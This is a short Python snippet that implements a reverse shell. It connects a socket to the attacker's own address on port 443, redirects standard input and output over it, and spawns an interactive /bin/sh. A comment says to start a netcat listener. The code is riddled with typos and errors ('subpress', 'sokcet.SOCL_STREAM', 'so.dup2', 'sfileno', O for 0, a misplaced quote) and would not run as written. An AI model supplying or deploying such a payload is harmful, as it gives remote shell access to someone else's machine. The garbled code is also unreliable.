#simple reverse shell python

import socket, subpress, os
s = socket(socket.AF_INET, sokcet.SOCL_STREAM)
s.connect(("your IP", 443)) #don't for get nc -lnvp 443
so.dup2(sfileno(),O)
so.dup2(sfileno(),1)
so.dup2(sfileno(),2)
subprocess.call(["/bin/sh," "-i"])
